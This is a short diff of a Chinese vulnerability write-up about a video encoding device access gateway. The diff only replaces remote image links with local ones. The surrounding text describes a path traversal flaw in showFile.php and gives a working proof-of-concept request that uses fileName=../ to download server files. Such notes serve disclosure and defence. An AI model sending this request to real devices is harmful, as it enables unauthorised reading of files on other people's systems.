@@ -20,7 +20,7 @@ title="视频编码设备接入网关"
 
 登录页面
 
-![image-20220519174129368](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191743965.png)
+![image-20220519174129368](./images/202205191743965.png)
 
 漏洞文件为 `showFile.php`, 其中 `参数 fileName` 没有过滤危险字符，导致可文件遍历下载
 
@@ -43,4 +43,4 @@ POC
 /serverLog/showFile.php?fileName=../web/html/main.php
 ```
 
-![image-20220519174337483](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191743535.png)
+![image-20220519174337483](./images/202205191743535.png)
